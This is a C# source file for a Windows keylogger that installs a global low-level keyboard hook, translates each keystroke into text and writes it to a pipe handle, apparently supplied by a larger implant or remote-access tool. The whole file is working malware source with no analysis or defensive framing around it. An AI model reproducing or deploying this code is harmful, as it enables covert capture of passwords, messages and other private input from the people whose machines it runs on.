using System;

using System.Diagnostics;
using System.IO.Pipes;
using System.Runtime.InteropServices;



namespace Keylogger
{
    [StructLayout(LayoutKind.Sequential)]
    struct MSG
    {
        public IntPtr hwnd;
        public UInt32 message;
        public UInt32 wParam;
        public IntPtr lParam;
        public UInt32 time;
        public Int32 ptX;
        public Int32 ptY;
        public UInt32 lPrivate;
    }


    public class Keylogger
    {
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        public delegate void KeyLogFunc(IntPtr Pipe);
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern short GetKeyState(int key);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        
        static extern int GetMessage(ref MSG msg, IntPtr HWND, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool TranslateMessage(ref MSG msg);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DispatchMessage(ref MSG msg);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern void PostQuitMessage(int exitCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool PostThreadMessageA(uint threadId, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr handle,UInt32 milsec);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern public IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 stacksize, KeyLogFunc func, IntPtr parameter, UInt32 flag, out UInt32 threadid);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool WriteFile(IntPtr handle, IntPtr data, uint length, IntPtr llengh, IntPtr overlap);

        

        

        private static IntPtr ClientPipe;

        public static void StartKeylogger(IntPtr pipe)
        {
            ClientPipe = pipe;

            var hook = SetWindowsHookEx(WH_KEYBOARD_LL, HandleKey, GetModuleHandle(IntPtr.Zero),0);
            MSG msg = new MSG();
            
            while (GetMessage(ref msg,IntPtr.Zero,0,0) > 0)
            {
                
                if(msg.message == 0x8001)
                {

                    

                    UnhookWindowsHookEx(hook);
                    PostQuitMessage(0);
                }
                else
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }
                
            }
            
            

        }


        private static IntPtr HandleKey(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode == 0)
            {
                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    bool  caps = Convert.ToBoolean(GetKeyState(0x14) & 0x0001);
                    bool shift = Convert.ToBoolean(GetKeyState(0x10) >> 15);
                     
                    string key;
                    switch (vkCode) // SWITCH ON INT
                    {
                        case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
                        case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
                        case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
                        case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
                        case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
                        case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
                        case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
                        case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
                        case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
                        case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
                        case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
                        case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
                        case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
                        case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
                        case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
                        case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
                        case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
                        case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
                        case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
                        case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
                        case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
                        case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
                        case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
                        case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
                        case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
                        case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
                        // Sleep Key
                        case 0x5F: key = "[SLEEP]"; break;
                        // Num Keyboard
                        case 0x60: key = "0"; break;
                        case 0x61: key = "1"; break;
                        case 0x62: key = "2"; break;
                        case 0x63: key = "3"; break;
                        case 0x64: key = "4"; break;
                        case 0x65: key = "5"; break;
                        case 0x66: key = "6"; break;
                        case 0x67: key = "7"; break;
                        case 0x68: key = "8"; break;
                        case 0x69: key = "9"; break;
                        case 0x6A: key = "*"; break;
                        case 0x6B: key = "+"; break;
                        case 0x6C: key = "-"; break;
                        case 0x6D: key = "-"; break;
                        case 0x6E: key = "."; break;
                        case 0x6F: key = "/"; break;
                        // Function Keys
                        case 0x70: key = "[F1]"; break;
                        case 0x71: key = "[F2]"; break;
                        case 0x72: key = "[F3]"; break;
                        case 0x73: key = "[F4]"; break;
                        case 0x74: key = "[F5]"; break;
                        case 0x75: key = "[F6]"; break;
                        case 0x76: key = "[F7]"; break;
                        case 0x77: key = "[F8]"; break;
                        case 0x78: key = "[F9]"; break;
                        case 0x79: key = "[F10]"; break;
                        case 0x7A: key = "[F11]"; break;
                        case 0x7B: key = "[F12]"; break;
                        case 0x7C: key = "[F13]"; break;
                        case 0x7D: key = "[F14]"; break;
                        case 0x7E: key = "[F15]"; break;
                        case 0x7F: key = "[F16]"; break;
                        case 0x80: key = "[F17]"; break;
                        case 0x81: key = "[F18]"; break;
                        case 0x82: key = "[F19]"; break;
                        case 0x83: key = "[F20]"; break;
                        case 0x84: key = "[F22]"; break;
                        case 0x85: key = "[F23]"; break;
                        case 0x86: key = "[F24]"; break;
                        case 0x87: key = "[F25]"; break;
                        // Keys
                        case 0x90: key = "[NUM-LOCK]"; break;
                        case 0x91: key = "[SCROLL-LOCK]"; break;
                        case 0x08: key = "[BACK]"; break;
                        case 0x09: key = "[TAB]"; break;
                        case 0x0C: key = "[CLEAR]"; break;
                        case 0x0D: key = "[ENTER]"; break;
                        case 0x10: key = "[SHIFT]"; break;
                        case 0x11: key = "[CTRL]"; break;
                        case 0x12: key = "[ALT]"; break;
                        case 0x13: key = "[PAUSE]"; break;
                        case 0x14: key = "[CAP-LOCK]"; break;
                        case 0x1B: key = "[ESC]"; break;
                        case 0x20: key = "[SPACE]"; break;
                        case 0x21: key = "[PAGEUP]"; break;
                        case 0x22: key = "[PAGEDOWN]"; break;
                        case 0x23: key = "[END]"; break;
                        case 0x24: key = "[HOME]"; break;
                        case 0x25: key = "[LEFT]"; break;
                        case 0x26: key = "[UP]"; break;
                        case 0x27: key = "[RIGHT]"; break;
                        case 0x28: key = "[DOWN]"; break;
                        case 0x29: key = "[SELECT]"; break;
                        case 0x2A: key = "[PRINT]"; break;
                        case 0x2C: key = "[PRTSCRN]"; break;
                        case 0x2D: key = "[INS]"; break;
                        case 0x2E: key = "[DEL]"; break;
                        case 0x2F: key = "[HELP]"; break;
                        // Number Keys with shift
                        case 0x30: key = shift ? ")" : "0"; break;
                        case 0x31: key = shift ? "!" : "1"; break;
                        case 0x32: key = shift ? "@" : "2"; break;
                        case 0x33: key = shift ? "#" : "3"; break;
                        case 0x34: key = shift ? "$" : "4"; break;
                        case 0x35: key = shift ? "%" : "5"; break;
                        case 0x36: key = shift ? "^" : "6"; break;
                        case 0x37: key = shift ? "&" : "7"; break;
                        case 0x38: key = shift ? "*" : "8"; break;
                        case 0x39: key = shift ? "(" : "9"; break;
                        // Windows Keys
                        case 0x5B: key = "[LWIN]"; break;
                        case 0x5C: key = "[RWIN]"; break;
                        case 0xA0: key = "[SHIFT]"; break;
                        case 0xA1: key = "[SHIFT]"; break;
                        case 0xA2: key = "[CTRL]"; break;
                        case 0xA3: key = "[CTRL]"; break;
                        // OEM Keys with shift
                        case 0xBA: key = shift ? ":" : ";"; break;
                        case 0xBB: key = shift ? "+" : "="; break;
                        case 0xBC: key = shift ? "<" : ","; break;
                        case 0xBD: key = shift ? "_" : "-"; break;
                        case 0xBE: key = shift ? ">" : "."; break;
                        case 0xBF: key = shift ? "?" : "/"; break;
                        case 0xC0: key = shift ? "~" : "`"; break;
                        case 0xDB: key = shift ? "{" : "["; break;
                        case 0xDC: key = shift ? "|" : "\\"; break;
                        case 0xDD: key = shift ? "}" : "]"; break;
                        case 0xDE: key = shift ? "\"" : "\'"; break; //TODO: Escape this char: "
                        // Action Keys
                        case 0xFA: key = "[PLAY]"; break;
                        case 0xFB: key = "[ZOOM]"; break;
                        case 0xFE: key = "[CLEAR]"; break;
                        case 0x03: key = "[CTRL-C]"; break;

                        default: key = "[UNK-KEY]"; break;
                    }
                    IntPtr data = Marshal.StringToHGlobalAnsi(key);
                   
                    WriteFile(ClientPipe, data,(uint) key.Length, IntPtr.Zero, IntPtr.Zero);
                    Marshal.FreeHGlobal(data);
                    
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        
        
    }
}